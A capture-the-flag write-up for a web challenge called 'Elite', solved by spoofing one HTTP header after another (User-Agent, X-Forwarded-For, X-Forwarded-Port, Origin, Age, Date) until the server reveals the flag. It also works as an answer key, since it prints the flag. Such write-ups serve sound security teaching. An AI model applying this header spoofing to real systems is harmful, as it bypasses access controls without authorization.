# Elite
## Description
> Do you think you are ELITE? If you really believe so...you are more than welcome to join our Elite Club. However, we will decide whether or not you are worthy enough to join us. All the best!
> 
> Check out our Website here:
> 
> http://chall.ycfteam.in:6375/

## Solution

1. Initial Request: The first request to the /elite endpoint results in a response stating that ```"Only Elite Agents can access this page."``` This suggests the need to modify the User-Agent header.

```http
GET /elite HTTP/1.1
Host: chall.ycfteam.in:6375
User-Agent: Elite
```
Response: The page now instructs that requests must go through a dedicated proxy chain with specific IP addresses.
```raw
Elite members can access this endpoint only via our dedicated proxy chain:
50.23.41.34
3.54.85.90
110.34.87.34
10.43.21.25
```

2. Bypassing Proxy Chain: The next step involves adding an X-Forwarded-For header with the IPs provided.

```http
X-Forwarded-For: 50.23.41.34, 3.54.85.90, 110.34.87.34, 10.43.21.25
```
Response: The server now asks that requests come from a specific port number, 31173.
```raw
Nope! We only accept requests from our Elite port number - 31173. Leave!
```

3. Adding the Required Port: Include the X-Forwarded-Port header with the port number.

```http
X-Forwarded-Port: 31173
```
Response: The server questions the request origin, suggesting the need for an Origin header matching the host.
```
Wait! Where did this request even originate from? How dare you try to enter our club.
```

4. Setting the Origin: Add an Origin header pointing to the challenge domain.

```http
Origin: http://chall.ycfteam.in:6375/
```
Response: The server checks if the request was cached by the proxy servers for 5 seconds each.
```
Something's fishy... Your request to join the elite club should have been cached in each proxy server for 5 seconds. I don't like this. I can't allow you to join. Be gone!
```
5. Adding Cache Age: Set an Age header with a value of 20 seconds to simulate caching (because 4 proxy servers x 5 seconds = 20).

```http
Age: 20
```
Response: The server replies that the registration for the club closed on 27th May 2024 at 11 AM IST.
```
Oops! It seems you are too late my friend... We already closed the club registration on 27th May 2024 at 11 AM IST. Maybe next time...See ya!
```
6. Manipulating the Date: Finally, adjust the Date header any time before the specified date.

```http
Date: Wed, 21 Oct 2015 07:30:00 GMT
```
Response: Success! The server confirms that you’ve proven to be "Elite" and provides the flag.
```
Alright then! You've proven that you are indeed Elite!! Congratulations on joining the club! It's great to have you on board with us. Here's your exclusive welcome gift: CyGenixCTF{W3lc0me_t0_Th3_ELIt3_5qU4d_5bf90dac2b7}
```
## Flag
```CyGenixCTF{W3lc0me_t0_Th3_ELIt3_5qU4d_5bf90dac2b7}```
This challenge involved progressively altering HTTP headers to bypass each security check imposed by the server, culminating in the successful retrieval of the flag.
